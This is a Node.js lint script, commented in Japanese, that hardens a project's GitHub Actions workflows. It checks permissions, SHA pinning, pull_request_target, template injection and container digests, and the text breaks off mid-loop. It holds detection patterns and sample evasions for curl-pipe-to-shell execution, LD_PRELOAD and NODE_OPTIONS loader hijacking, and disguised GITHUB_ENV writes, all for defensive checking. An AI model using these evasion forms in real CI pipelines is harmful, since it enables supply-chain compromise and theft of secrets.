#!/usr/bin/env node
/**
 * lint:workflow-security — GitHub Actions 側の守りを固定する。
 *
 * 2026-08-22 の点検で入れた。ここまで verify:all の 25 ゲートは**リポジトリの
 * 中身**しか見ておらず、`.github/workflows/` は誰も検査していなかった。
 * ところがワークフローは、コード署名の鍵と Apple の資格情報を持ち、
 * **利用者がダウンロードするインストーラを公開する**場所である。
 *
 * 見るのは 4 つ:
 *
 *  1. **`permissions:` の明示** — 書かないと組織/リポジトリの既定を継ぐ。
 *     環境によっては `contents: write` が既定で、CI が黙って書き込み権限を
 *     持つ。点検時、6 本のうち ci と e2e の 2 本が未宣言だった —
 *     **一番よく走るものが一番広い権限**という状態。
 *
 *  2. **第三者 action の SHA 固定** — `owner/repo@v2` のような可動タグは、
 *     タグを差し替えられた瞬間に別のコードになる。`contents: write` を持つ
 *     release で起きれば、**リリース資産 (= 配布物) を差し替えられる**。
 *     GitHub 自身の hardening ガイドが SHA 固定を勧めている。
 *     `actions/*` (GitHub 自身) はタグ固定を許す。
 *
 *  3. **`pull_request_target` の禁止** — fork の PR に対して secrets 付きで
 *     走るトリガ。PR の中身を checkout すると、fork のコードが secrets を
 *     読める。今は 1 本も無い。「無い」ことを固定する。
 *
 *  4. **`run:` への `${{ }}` の埋め込み** — PR の題名や本文、
 *     ブランチ名はいくらでも書ける。`${{ github.event.pull_request.title }}`
 *     をシェルへ展開すると、そのままコマンド注入になる。
 *
 *  5. **job 単位の `permissions:` は台帳制** (2026-10-14 · パス 520 · threat: T-039) ——
 *     トップレベルが `contents: read` でも job は広げられる。書く権限を持つ job は
 *     `JOB_PERMISSIONS_ALLOW` に **job 名と scope を 1 つずつ**載せ、実物と双方向に
 *     突き合わせる (台帳に無い job・台帳と違う scope・台帳に在るのに実物に無い job は
 *     どれも落ちる)。それまでこの門は job 単位の `permissions:` を**一律に落とす**だけで、
 *     `pages.yml` は「全体に `pages: write` / `id-token: write`」という**広い方**へ
 *     逃げていた (`npm ci` と組み立てが公開の権限の下で走る)。
 *
 *  6. **ローカル action・docker://・run: の本文** (2026-10-19 · パス 530 · threat: T-120) ——
 *     それまで `uses: ./…` と `docker://…` は**無条件に飛ばし**、`run:` は `${{ }}` の
 *     形しか見なかった。実測 (狩り 527 の再現): `uses: ./.github/actions/x` の中身
 *     (未固定の第三者 action・`curl | sh`) は誰にも走査されず、`run:` に
 *     `echo "PATH=…" >> $GITHUB_ENV` や `NODE_OPTIONS=--require …` を書いても exit 0 だった。
 *     今は ① ローカルの composite action (`.github/actions/**\/action.yml`) を workflow と
 *     同じ規則で走査し、`uses: ./…` は**実在するその木の中**だけを指すこと ② `docker://` は
 *     `@sha256:` のダイジェスト固定 ③ SHA 固定には版の注記 (`# v5`) を要求 ④ `run:` の
 *     遠隔コード実行 (`curl … | sh`)・後続ステップへ効く `GITHUB_ENV` / `GITHUB_PATH` への書き込み・
 *     ローダを差し替える環境変数 (`NODE_OPTIONS` ほか。`--max-old-space-size=N` だけは可) を断る。
 *     ★ **40 桁の 16 進が実在の commit かは機械で確かめられない** (ネットワークが要る) —— 版の注記は
 *     その手での確認 (`git ls-remote`) の足がかりであって保証ではない。
 *
 * Run: node scripts/lint-workflow-security.cjs [--self-test]
 */
const fs = require('fs');
const path = require('path');
const { reportTrackedCrossCheck, crossCheckSuffix } = require('./lib/tracked-cross-check.cjs');

const REPO_ROOT = path.resolve(__dirname, '..');
const WF_DIR = path.join(REPO_ROOT, '.github', 'workflows');

/**
 * SHA 固定されていない第三者 action の台帳。**減らすのが目的**。
 * 消せない理由と、消し方を書くこと。
 */
const UNPINNED_ALLOW = {
  // 2026-10-14 (パス 519) に空になった。唯一の項目 `softprops/action-gh-release@v2` は
  // `git ls-remote --tags` (git プロキシは公開リポジトリを通す —— 台帳が「塞がっている」と
  // 書いた 3 通りは GitHub の REST だけだった) で `refs/tags/v2` を解決し、軽量タグが
  // `refs/tags/v2.6.2` と同じコミットを指すことを確かめてから SHA で固定した
  // (`release.yml` の `# v2.6.2` の注記がそのタグ)。**空の台帳は床ではない** —— 次に
  // タグ固定の action が入れば下の検査が鳴り、台帳へ載せるには理由と消し方が要る。
};

/**
 * job 単位の `permissions:` の台帳 (threat: T-039)。**file → job 名 → { scopes, why }**。
 *
 * scope は `key: value` の綴りで、実物のブロックと**集合として一致**しなければ落ちる
 * (1 つ足しても 1 つ消しても鳴る)。載せてよいのは「任意コードを走らせない job」だけ ——
 * `npm ci` / 組み立て / 第三者 action を同じ job に置くなら、その権限はそのコードが持つ。
 * 読むだけの job をここへ載せる必要は無い (トップレベルの `contents: read` で足りる)。
 */
const JOB_PERMISSIONS_ALLOW = {
  'release.yml': {
    build: {
      scopes: ['contents: write'],
      why:
        'GitHub Release へ資産を上げるのはこの job だけ (softprops/action-gh-release)。トップレベルは contents: read で、' +
        '検査 (npm test / verify:all) は secrets も書き込み権も持たない verify job に分けた (T-144)',
    },
  },
  'pages.yml': {
    deploy: {
      scopes: ['pages: write', 'id-token: write'],
      why:
        'Pages へ公開するのはこの job だけ。`needs: build` が検査済みの成果物を受け取り、' +
        '`npm ci` も組み立ても走らせない (`actions/deploy-pages` 1 手だけ)。2026-10-14 まで' +
        'この 2 つはワークフロー全体に付いており、依存の postinstall が公開の権限で走っていた',
    },
  },
};

/**
 * job 単位の `permissions:` ブロックを 1 つずつ返す —— `{ job, line, scopes }`。
 *
 * YAML を解析せず、GitHub Actions が受け付ける形だけを読む: `jobs:` の下の
 * 2 空白の鍵が job 名、その下の `permissions:` の直後に深い字下げで並ぶ
 * `key: value` が scope。`permissions: read-all` のような 1 行の値も scope 1 つとして
 * 返す (台帳には `write-all` を載せられない —— 上の検査が先に落とす)。
 * `jobs:` より前 (トップレベル) の `permissions:` はここでは返さない。
 */
function jobPermissionBlocks(text) {
  const lines = text.split('\n');
  const out = [];
  let inJobs = false;
  let job = null;
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (/^jobs:\s*$/.test(line)) { inJobs = true; job = null; continue; }
    if (/^\S/.test(line)) { inJobs = false; job = null; }
    if (!inJobs) continue;
    const jm = /^ {2}([\w.-]+):\s*(?:#.*)?$/.exec(line);
    if (jm) { job = jm[1]; continue; }
    const pm = /^(\s+)permissions:\s*([^\s#]*)/.exec(line);
    if (!pm) continue;
    const indent = pm[1].length;
    const scopes = [];
    if (pm[2]) scopes.push(pm[2]);
    for (let j = i + 1; j < lines.length; j++) {
      const sm = /^(\s+)([\w-]+):\s*([^\s#]+)/.exec(lines[j]);
      if (!sm || sm[1].length <= indent) break;
      scopes.push(`${sm[2]}: ${sm[3]}`);
    }
    out.push({ job: job ?? '(job 外)', line: i + 1, scopes });
  }
  return out;
}

function sameScopes(a, b) {
  const x = [...a].sort();
  const y = [...b].sort();
  return x.length === y.length && x.every((v, i) => v === y[i]);
}

/** シェルへ展開されると注入になりうる文脈値 (利用者が中身を書ける)。 */
const UNTRUSTED_CONTEXT =
  /\$\{\{\s*github\.(event\.(issue|pull_request|comment|review|discussion)\b[^}]*|head_ref)\s*\}\}/;

/** GitHub 側が値を決めるもの (SHA / イベント名 / ref 名) は注入に使えない。 */
const SAFE_CONTEXT = /\$\{\{\s*github\.(event_name|event\.before|event\.after|ref_name|sha|repository|workflow|run_id)\s*\}\}/g;

/**
 * `run:` の中の `${{ }}` そのもの。
 *
 * 上の `UNTRUSTED_CONTEXT` は「危ない文脈の列挙」で、列挙は必ず遅れる:
 * `github.event.workflow_run.head_branch` / `github.event.release.*` /
 * `inputs.*` (workflow_dispatch は利用者が値を書く) / `needs.*.outputs.*` /
 * `steps.*.outputs.*` — どれも載っていなかった。実際に **`mutation.yml` の
 * `steps.scope.outputs.targets`** (実行時に Node スクリプトが決める値) が
 * この網の外を通っていた (2026-08-23 実測: run: 内の展開は全 6 ワークフローで
 * 3 件、うち 2 件が SAFE_CONTEXT、残る 1 件がこれ)。
 *
 * 列挙をやめて仕組みを禁じる: `${{ }}` は **run: のシェル本文へ文字列として
 * 展開されてからシェルが読む**ので、値の中身がそのままシェル構文になる。
 * `env:` へ束ねれば値は環境変数として渡り、シェル構文としては一度も読まれない。
 * 「安全な文脈かどうか」を判断する必要が消え、規則は行の形だけで決まる。
 */
const TEMPLATE_EXPR = /\$\{\{/;

/**
 * **走査の条件** (`workflows()` が使う物そのもの · 2026-09-26 · パス 472)。
 *
 * 走査は再帰しないので「`.github/workflows/` の直下」を経路の条件で表す ——
 * 根 (`.github`) だけでは `ISSUE_TEMPLATE/` のような別の木まで要求してしまう。
 */
const CROSS_CHECK = {
  roots: ['.github'],
  skipDirs: [],
  accept: (name) => /\.ya?ml$/.test(name),
  // workflow は直下の YAML、ローカル action は `.github/actions/**/action.y(a)ml` (パス 530)。
  acceptPath: (rel) =>
    (rel.startsWith('.github/workflows/') && rel.split('/').length === 3) ||
    (rel.startsWith('.github/actions/') && /\/action\.ya?ml$/.test(rel)),
};

const ACTIONS_DIR = path.join(REPO_ROOT, '.github', 'actions');

/** `.github/actions/` の下の `action.yml` / `action.yaml` を再帰で拾う (経路は `/` 区切り)。 */
function localActionFiles(dir = ACTIONS_DIR, rel = '') {
  if (!fs.existsSync(dir)) return [];
  const out = [];
  for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
    const next = rel === '' ? e.name : `${rel}/${e.name}`;
    if (e.isDirectory()) out.push(...localActionFiles(path.join(dir, e.name), next));
    else if (/^action\.ya?ml$/.test(e.name)) out.push(next);
  }
  return out;
}

/** 走査の名前 —— workflow は素のファイル名、ローカル action は `actions/<dir>/action.yml`。 */
const isLocalActionName = (name) => name.startsWith('actions/');

/** 走査の名前をリポジトリ相対の経路へ (追跡ファイルとの照合用)。 */
const scanRelPath = (name) =>
  isLocalActionName(name) ? path.posix.join('.github', name) : path.posix.join('.github', 'workflows', name);

function workflows(wfDir = WF_DIR, actionsDir = ACTIONS_DIR) {
  const flows = fs.existsSync(wfDir)
    ? fs
        .readdirSync(wfDir)
        .filter((f) => /\.ya?ml$/.test(f))
        .map((f) => ({ name: f, text: fs.readFileSync(path.join(wfDir, f), 'utf8') }))
    : [];
  const actions = localActionFiles(actionsDir).map((rel) => ({
    name: `actions/${rel}`,
    text: fs.readFileSync(path.join(actionsDir, ...rel.split('/')), 'utf8'),
  }));
  return [...flows, ...actions];
}

/**
 * job の `container:` / `services:` が指すイメージのうち、ダイジェスト (`@sha256:<64 桁>`) で
 * 固定されていない物 (2026-10-19 · パス 533 · threat: T-123)。`uses: docker://` はパス 530 で
 * 固定を要求したが、job が実行環境として引くイメージは**同じ供給網の入口なのに無縛**だった
 * (今日の workflow は `container:` も `services:` も 0 件 —— 罠の除去)。
 *
 * 形は 3 つ: `container: <image>` (スカラー) / `container:` の子の `image:` /
 * `services:` の下の各サービスの `image:`。子は「その鍵より深い段の行」で数える。
 * `${{ }}` を含む参照はダイジェストで終わらないので同じ規則で落ちる (式で組んだイメージは固定できない)。
 */
function containerImageProblems(lines) {
  const out = [];
  const stripComment = (s) => s.replace(/\s+#.*$/, '').trim();
  const unquote = (s) => s.replace(/^(['"])(.*)\1$/, '$2');
  const pinned = (ref) => /@sha256:[0-9a-f]{64}$/.test(ref);
  for (let i = 0; i < lines.length; i++) {
    const m = /^(\s*)(container|services):\s*(.*)$/.exec(lines[i]);
    if (!m) continue;
    const indent = m[1].length;
    const scalar = unquote(stripComment(m[3]));
    if (m[2] === 'container' && scalar !== '' && !scalar.startsWith('|') && !scalar.startsWith('>')) {
      if (!pinned(scalar)) out.push({ line: i + 1, ref: scalar });
      continue;
    }
    for (let j = i + 1; j < lines.length; j++) {
      const l = lines[j];
      if (l.trim() === '') continue;
      if ((/^(\s*)/.exec(l)?.[1].length ?? 0) <= indent) break;
      const im = /^\s*image:\s*(.*)$/.exec(l);
      if (!im) continue;
      const ref = unquote(stripComment(im[1]));
      if (!pinned(ref)) out.push({ line: j + 1, ref });
    }
  }
  return out;
}

/**
 * `uses: ./…` (同じリポジトリ) の行き先の問題。無ければ `null`。
 *
 * 載せてよいのは **`.github/actions/<dir>` (その下に `action.yml` が在る)** と
 * **`.github/workflows/<file>.yml` (再利用 workflow)** だけで、どちらも**走査の対象**になる
 * (`names` はその一覧)。`..` で木の外へ出る形・リポジトリ直下 (`./`) ・走査に載らない
 * 場所は、中身を誰も読まないので断る (パス 530)。
 */
function localUsesProblem(ref, names) {
  const reusable = /^\.\/\.github\/workflows\/([\w.-]+\.ya?ml)$/.exec(ref);
  if (reusable) {
    return names.has(reusable[1]) ? null : `再利用 workflow ${reusable[1]} が見つからない`;
  }
  const act = /^\.\/\.github\/actions\/((?:[\w.-]+\/)*[\w.-]+)\/?$/.exec(ref);
  // `..` / `.` を含む経路は、`names` (実際に歩いた正規の名前) に載らないので下の照合で落ちる。
  if (!act) {
    return '`.github/actions/<dir>` か `.github/workflows/<file>.yml` の外を指している (中身が走査されない)';
  }
  return names.has(`actions/${act[1]}/action.yml`) || names.has(`actions/${act[1]}/action.yaml`)
    ? null
    : `\`.github/actions/${act[1]}/action.yml\` が見つからない`;
}

/**
 * ローダ・探索経路を差し替えて**後続の任意コードに効く**環境変数。`NODE_OPTIONS` は
 * `--max-old-space-size=N` だけなら可 (mutation.yml が実際に使う)。
 */
const LOADER_ENV =
  /\b(NODE_OPTIONS|LD_PRELOAD|LD_LIBRARY_PATH|DYLD_INSERT_LIBRARIES|BASH_ENV|NODE_PATH|PYTHONPATH|PYTHONSTARTUP)\s*[=:]\s*(.*)$/;

/** 1 行 (注記を落とした後) の環境変数の問題。無ければ `null`。 */
function loaderEnvProblem(line) {
  const m = LOADER_ENV.exec(line);
  if (!m) return null;
  if (m[1] === 'NODE_OPTIONS' && /^["']?--max-old-space-size=\d+["']?\s*$/.test(m[2])) return null;
  return `${m[1]} を設定している — 後続の任意コードの読み込みを差し替えられる`;
}

/** `run:` の 1 行が持つ、内容そのものの危険。無ければ `null`。 */
function runBodyProblem(line) {
  if (
    /\b(?:curl|wget)\b[^\n]*\|\s*(?:sudo\s+)?(?:(?:ba|z|da|k)?sh|python3?|node|perl|ruby)\b/.test(line) ||
    /(?:\b(?:ba|z|da|k)?sh\s+(?:-\w+\s+)*["']?|\beval\s+["']?|\bsource\s+|(?:^|\s)\.\s+)(?:\$\(|<\()\s*(?:curl|wget)\b/.test(line)
  ) {
    return '遠隔のコードを取得してそのまま実行している (curl | sh の形)';
  }
  // 2026-10-21 (パス 545 · T-160): 名前を組み立てて GITHUB_ENV へ書く (`F=GITHUB_E; >> "${F}NV"`) と上の綴りの
  // 規則は素通りする。リダイレクト先が変数の合成・コマンド置換・`eval` の行は、行き先を読めないので断る。
  // (`>> "$GITHUB_OUTPUT"` / `"$GITHUB_STEP_SUMMARY"` のような単独の変数は通す)
  if (/>>?\s*["']?[^\s"']*(?:\$\{\w+\}\w|\$\(|`)/.test(line) || /(?:^|[\s;&|])eval\b/.test(line)) {
    return 'リダイレクト先を組み立てている・eval している — 書き込み先 (GITHUB_ENV など) が静的に読めない';
  }
  if (/\bGITHUB_(?:ENV|PATH)\b/.test(line)) {
    return 'GITHUB_ENV / GITHUB_PATH へ書いている — 後続のステップの環境・PATH を書き換えられる';
  }
  return loaderEnvProblem(line);
}

/** `run:` ブロックの行だけを取り出す (インデントで範囲を決める素朴な走査)。 */
function runBlockLines(text) {
  const out = [];
  const lines = text.split('\n');
  let inRun = false;
  let indent = 0;
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    const m = /^(\s*)-?\s*run:\s*\|?/.exec(line);
    if (m) {
      inRun = true;
      indent = m[1].length;
      out.push([i + 1, line]);
      continue;
    }
    if (!inRun) continue;
    const cur = /^(\s*)\S/.exec(line);
    if (line.trim() === '') continue;
    if (cur && cur[1].length <= indent) {
      inRun = false;
      continue;
    }
    out.push([i + 1, line]);
  }
  return out;
}

/**
 * 行単位の規則が読めない YAML の書き方と、ゲートの step を黙らせる鍵 (2026-10-20 · パス 544 · threat: T-145)。
 *
 * この門の規則は行頭の `uses:` / `run:` / `script:` を正規表現で読む。YAML のフロー記法
 * (`- {uses: evil/act@v1}`・`steps: [{run: …}]`) や引用符つきの鍵 (`- "run": curl … | sh`) は
 * 同じ step を表すのに規則の目に入らず、実測 (js-yaml で同じ step と確認) で未固定の第三者 action・
 * `curl | sh`・`${{ }}` の script 注入が exit 0 で通った。**読めない形は fail closed で落とす** (実物に 0 件)。
 *
 * もう 1 つ: ci.yml / pages.yml は「ゲートが走ること」そのものを守る workflow なので、step や job を
 * 黙らせる鍵 (`continue-on-error` / `if` / `shell` / `working-directory` / `paths` / `paths-ignore` /
 * `branches-ignore`) を**一切**許さない (実物に 0 件)。足すなら台帳へ理由を書くこと
 * (`GATE_NEUTERING_ALLOW` —— 今は空)。
 */
const GATE_WORKFLOWS = new Set(['ci.yml', 'pages.yml']);
const GATE_NEUTERING_KEYS = /^\s*-?\s*["']?(continue-on-error|if|shell|working-directory|paths|paths-ignore|branches-ignore|tags-ignore)["']?\s*:/;
const GATE_NEUTERING_ALLOW = {};
function structureProblems(name, text) {
  const out = [];
  const lines = text.split('\n');
  lines.forEach((raw, i) => {
    const line = raw.replace(/\s+#.*$/, '');
    if (/^\s*#/.test(raw)) return;
    const at = `${name}:${i + 1}`;
    if (/^\s*-\s*\{(?!\{)/.test(line) || /^\s*-\s*\[/.test(line) || /\b(steps|jobs|with|env|permissions|runs-on)\s*:\s*[[{]/.test(line)) {
      out.push({ file: at, why: 'YAML のフロー記法 ({…} / […]) は行単位の規則が読めない — ブロック記法で書くこと (読めない形は落とす)' });
    }
    if (/^\s*-?\s*["'](uses|run|script|shell|if|env|with|permissions|continue-on-error|working-directory|persist-credentials)["']\s*:/.test(line)) {
      out.push({ file: at, why: '引用符つきの鍵は行単位の規則が読めない — 引用符なしの鍵で書くこと' });
    }
    // 2026-10-21 (パス 545 · threat: T-160): js-yaml が同じ step と読む書き方のうち、行頭の `uses:` を
    // 見る規則に映らない物。実測 —— 未固定の第三者 action が exit 0 で通った 3 形:
    //   ① `uses : evil/act@v1` (鍵と : の間の空白) ② `uses:` の値を次の行へ送る ③ `- &a uses: …` (アンカー)。
    // どれも**読めない形は落とす**側 (実物に 0 件)。
    if (/^\s*(?:-\s*)?["']?(?:uses|run|script|shell|if|env|with|permissions)["']?\s+:/.test(line)) {
      out.push({ file: at, why: '鍵と : の間に空白がある書き方は行単位の規則が読めない — `key:` と詰めて書くこと (読めない形は落とす)' });
    }
    if (/^\s*(?:-\s*)?uses:\s*$/.test(line)) {
      out.push({ file: at, why: '`uses:` の値を次の行へ送る書き方は行単位の規則が読めない — 同じ行に書くこと (読めない形は落とす)' });
    }
    if (/^\s*-\s*[&*!]\S/.test(line) || /^\s*(?:-\s*)?[\w-]+:\s+[&*!][!\w-]/.test(line) || /^\s*(?:-\s*)?<<\s*:/.test(line)) {
      out.push({ file: at, why: 'YAML のアンカー・エイリアス・タグ・マージキー (& * ! <<) は行単位の規則が読めない — 展開して書くこと (読めない形は落とす)' });
    }
    if (GATE_WORKFLOWS.has(name) && GATE_NEUTERING_KEYS.test(line)) {
      const key = GATE_NEUTERING_KEYS.exec(line)[1];
      if (!GATE_NEUTERING_ALLOW[`${name}::${key}`]) {
        out.push({ file: at, why: `\`${key}:\` はゲートの step / job を黙らせる鍵 — ${name} には置けません (台帳 GATE_NEUTERING_ALLOW に理由つきで)` });
      }
    }
  });
  return out;
}

/**
 * workflow が YAML として**読めるか** (2026-10-23 · パス 546)。この門の規則は行単位の正規表現なので、
 * YAML として壊れた workflow も通してしまう。実測: #827 が step 名に `: ` を含めた
 * (`- name: Smoke (packaged app: fuses applied)`) だけで e2e.yml は読めなくなり、GitHub は push のたびに
 * 0 秒の失敗 run を作り、手動実行 (workflow_dispatch) も `run-e2e` ラベルも効かなくなった。
 * 門は exit 0・ci.yml も緑のまま、気付いたのは次のセッションの再確認。js-yaml は ESLint の依存として
 * 常に node_modules に在る。読み込めなければ「読めるか確かめられない」を落とす (fail closed)。
 */
function yamlParseProblem(name, text) {
  let yaml;
  try {
    yaml = require('js-yaml');
  } catch {
    return { file: name, why: 'js-yaml を読み込めず、YAML として読めるか確かめられない (npm ci を実行すること)' };
  }
  try {
    yaml.load(text);
    return null;
  } catch (e) {
    const where = e && e.mark ? `:${e.mark.line + 1}` : '';
    const reason = String((e && e.reason) || 'parse error').slice(0, 120);
    return { file: `${name}${where}`, why: `YAML として読めない (${reason}) — GitHub はこの workflow を実行できず、push のたびに 0 秒の失敗を作る。\`: \` を含む値は引用符で囲むこと` };
  }
}

/*
 * `allow` は既定で実物の台帳。**差し替えられるのは self-test のため**である ——
 * 台帳の掃除を見る枝は「台帳に載っているものが使われなくなった」状態でしか
 * 動かず、実物では今その項目が使用中なので、**production では一度も通らない道**
 * だった (2026-08-25 の実測: この枝を潰しても本番スキャンも self-test も鳴らない)。
 */
function check(list, allow = UNPINNED_ALLOW, jobAllow = JOB_PERMISSIONS_ALLOW) {
  const problems = [];
  const seenUnpinned = new Set();
  const seenJobBlocks = new Set(); // `file::job` —— 台帳の逆向きに使う
  const names = new Set(list.map((w) => w.name));
  for (const { name, text } of list) {
    // composite action は `permissions:` を持てない (権限は呼び出した job のもの)。
    if (!isLocalActionName(name) && !/^permissions:/m.test(text)) {
      problems.push({
        file: name,
        why: '`permissions:` が未宣言 — 既定 (環境によっては contents: write) を継ぐ',
      });
    }
    problems.push(...structureProblems(name, text));
    /*
     * **宣言していることと、実効の広さは別である。**
     *
     * 上の検査は `^permissions:` (トップレベル) しか見ない。2026-08-26 の実測:
     * トップが `contents: read` でも、job が `permissions: write-all` を
     * 書けば**その job の実効権限は write-all** になり、この門は通した。
     * 冒頭の注記が心配していた「一番よく走るものが一番広い権限」が、
     * まさに見えない形で起きうる。
     *
     * 実物 6 本は job 単位の `permissions:` を 1 つも持たない (実測) ので、
     * 「持つなら台帳に理由を書く」で足りる。`write-all` は常に鳴らす ——
     * 絞る目的の宣言としては意味を成さない。
     */
    if (/permissions:\s*write-all/.test(text) || /^\s+-?\s*write-all\s*$/m.test(text)) {
      problems.push({
        file: name,
        why: 'permissions: write-all — 絞る目的の宣言になっていない。要る権限だけを列挙すること',
      });
    }
    // 2026-10-14 (パス 520) まで、ここは job 単位の `permissions:` を一律に落としていた
    // (台帳の名前を文面で呼ぶだけで、台帳そのものが無かった)。
    const fileAllow = Object.hasOwn(jobAllow, name) ? jobAllow[name] : {};
    for (const b of jobPermissionBlocks(text)) {
      const entry = Object.hasOwn(fileAllow, b.job) ? fileAllow[b.job] : null;
      // 台帳の job が実物に在ることはここで印を付ける (scope の食い違いは下で 1 度だけ報せる ——
      // 逆向きの「実物に無い」と二重に鳴らさない)。
      if (entry) seenJobBlocks.add(`${name}::${b.job}`);
      if (entry && sameScopes(entry.scopes, b.scopes)) continue;
      problems.push({
        file: `${name}:${b.line}`,
        why: entry
          ? `job "${b.job}" の permissions が台帳と違う (実物: ${b.scopes.join(', ') || '(空)'} / ` +
            `台帳: ${entry.scopes.join(', ')}) — 台帳の scope と 1 つずつ一致させること`
          : `job "${b.job}" の permissions: — トップレベルより広くできるので、実効の広さが` +
            'ここだけ変わります。要るなら JOB_PERMISSIONS_ALLOW へ job 名・scope・理由を書くこと',
      });
    }
    // **綴りを問わず**: `on: pull_request_target` / `on: [push, pull_request_target]` /
    // `- pull_request_target` / `"pull_request_target":` / `{pull_request_target: {…}}` はどれも有効な
    // YAML で、以前の `^\s*pull_request_target:` は map の形 1 つしか見なかった (パス 524 · T-085 ·
    // 実測 5 形が素通り)。注記を落としたうえで、語として現れたら断る。
    const withoutComments = text
      .split('\n')
      .map((l) => l.replace(/(^|\s)#.*$/, '$1'))
      .join('\n');
    if (/(^|[^\w-])pull_request_target(?![\w-])/.test(withoutComments)) {
      problems.push({
        file: name,
        why: 'pull_request_target — fork の PR が secrets 付きで走る',
      });
    }
    // ローダを差し替える環境変数は、`env:` の鍵にも `run:` の `export X=` にも現れる —— 注記を落とした全行で見る。
    withoutComments.split('\n').forEach((l, idx) => {
      const why = loaderEnvProblem(l);
      if (why) problems.push({ file: `${name}:${idx + 1}`, why });
    });
    const lines = text.split('\n');
    // actions/github-script の `script:` は JavaScript なので、`${{ … }}` を埋め込むと信用できない値が
    // コードになる (run: と同じ注入。パス 524 · T-085)。`script:` の本体 (ブロックの続き行) を見る。
    for (let i = 0; i < lines.length; i++) {
      const sm = /^(\s*)-?\s*script:\s*(.*)$/.exec(lines[i]);
      if (!sm) continue;
      const indent = sm[1].length;
      const body = [sm[2]];
      for (let j = i + 1; j < lines.length; j++) {
        const l = lines[j];
        if (l.trim() === '') { body.push(l); continue; }
        if ((/^(\s*)/.exec(l)?.[1].length ?? 0) <= indent) break;
        body.push(l);
      }
      if (body.some((l) => /\$\{\{/.test(l))) {
        problems.push({
          file: `${name}:${i + 1}`,
          why: 'script: に ${{ … }} を埋め込んでいる — 信用できない値が JavaScript のコードになる。env: に渡して process.env から読むこと',
        });
      }
    }
    for (let i = 0; i < lines.length; i++) {
      const m = /^\s*-?\s*uses:\s*([^\s#]+)/.exec(lines[i]);
      if (!m) continue;
      const ref = m[1];
      if (ref.startsWith('./')) {
        // 同じリポジトリの action / 再利用 workflow —— 中身は走査に載っている物だけを指させる (パス 530)。
        const why = localUsesProblem(ref, names);
        if (why) problems.push({ file: `${name}:${i + 1}`, why: `uses: ${ref} — ${why}` });
        continue;
      }
      if (ref.startsWith('docker://')) {
        // タグは動く。イメージはダイジェスト (`@sha256:…`) で固定する (パス 530)。
        if (!/@sha256:[0-9a-f]{64}$/.test(ref)) {
          problems.push({
            file: `${name}:${i + 1}`,
            why: `docker:// のイメージがダイジェストで固定されていません (${ref}) — \`@sha256:<64 桁>\` にすること`,
          });
        }
        continue;
      }
      /*
       * GitHub 自身 (`actions/*`) は SHA 固定を免除する —— **ただし「版のタグ」に限る**。
       *
       * 2026-08-26 まで `startsWith('actions/')` だけを見ており、
       * `actions/checkout@main` も `actions/checkout@my-branch` も素通りした (実測)。
       * 上の注記は「タグ固定を許す」と書いてあるのに、**枝も許していた**。
       * 枝は動く先であって固定ではない。
       *
       * 実物は `@v3` / `@v4` / `@v7` の 7 種だけなので、受理すべき対象は落ちない。
       */
      // **SHA 固定は誰であれ常に可**。ここを `actions/` の分岐より後ろに置くと、
      // `actions/checkout@<sha>` (最も固い形) を落とす —— 実際に落とした。
      if (/@[0-9a-f]{40}$/.test(ref)) {
        // 40 桁が実在の commit かは機械で確かめられない。せめて「どの版のつもりか」を残させる ——
        // 手での確認 (`git ls-remote <repo> refs/tags/<tag>`) の足がかりになる (パス 530)。
        if (!/^\s*-?\s*uses:\s*\S+\s+#\s*v?\d/.test(lines[i])) {
          problems.push({
            file: `${name}:${i + 1}`,
            why: `SHA 固定に版の注記 (\`# v5\` など) が無い (${ref}) — どのタグのつもりで固定したかを残すこと`,
          });
        }
        if (/^actions\/checkout@/.test(ref) && !stepPersistsNoCredentials(lines, i)) {
          /*
           * **checkout は `persist-credentials: false` を要求する** (2026-10-15 · パス 522 ·
           * threat: T-056)。既定 (true) では `GITHUB_TOKEN` が `.git/config` の
           * `http.extraheader` に残り、その job のあとの全ステップ (`npm ci` の
           * postinstall・組み立ての script・第三者 action) がそれを読める。
           * この repo の workflow は 7 本とも push しない (release は action-gh-release が
           * env の token を、pages は deploy-pages が自分の token を、knowledge-auto は
           * github-script が `github.token` を使う) ので、残す理由が 1 つも無い。
           * 実測 (2026-10-15): 10 の checkout すべてが既定のままだった。
           */
          problems.push({
            file: `${name}:${i + 1}`,
            why: `actions/checkout に \`with: persist-credentials: false\` が無い — 後続ステップへ GITHUB_TOKEN を残さないこと`,
          });
        }
        continue;
      }
      /*
       * **GitHub 自身 (`actions/*`) も SHA で固定する** (2026-10-15 · パス 522 · threat: T-057)。
       * 2026-08-26 から「版のタグに限る」免除を持っていたが、`@v5` は動く参照であり
       * (GitHub は major タグを新しい patch へ動かす)、`actions/` の名前空間は
       * 第三者より信用できるだけで**不変ではない**。実物は 2026-10-15 まで 30 か所
       * すべてが版のタグだった。版は `# v5` の注記で残し、動かすときは
       * `git ls-remote https://github.com/actions/<name>.git refs/tags/<tag>` で
       * 引き直す (lightweight tag なので ls-remote の SHA がそのまま commit)。
       */
      if (ref.startsWith('actions/')) {
        problems.push({
          file: `${name}:${i + 1}`,
          why: `actions/* が SHA で固定されていません (${ref}) — 40 桁の commit SHA にして \`# vN\` を注記に残すこと`,
        });
        continue;
      }
      seenUnpinned.add(ref);
      // `in` / 素の添字はプロトタイプ鎖まで辿るので、`uses: constructor` の
      // ような名前が台帳に載っていることになり、**未固定の検査ごと飛ばされる**。
      if (Object.hasOwn(allow, ref)) continue;
      problems.push({
        file: `${name}:${i + 1}`,
        why: `第三者 action がタグ固定 (${ref}) — SHA で固定するか台帳へ`,
      });
    }
    for (const c of containerImageProblems(lines)) {
      problems.push({
        file: `${name}:${c.line}`,
        why: `job の container:/services: のイメージがダイジェストで固定されていません (${c.ref}) — \`@sha256:<64 桁>\` にすること`,
      });
    }
    // `curl … |` の次の行に `sh` が続く形も 1 本のシェル行 (トレイリングの `|` `\\` `&&` `||` は行をまたぐ)。
    const runLines = runBlockLines(text);
    const joinedBodies = new Map(); // 開始行 → 継続を畳んだ 1 本の行
    for (let k = 0; k < runLines.length; k++) {
      let [ln0, acc] = runLines[k];
      while (!/^\s*-?\s*run:\s*[|>][+-]?\s*$/.test(acc) && /(?:\||\\|&&)\s*$/.test(acc) && k + 1 < runLines.length && runLines[k + 1][0] === runLines[k][0] + 1) {
        k += 1;
        acc = acc.replace(/\\\s*$/, ' ') + ' ' + runLines[k][1].trim();
      }
      joinedBodies.set(ln0, acc);
    }
    for (const [ln, line] of runLines) {
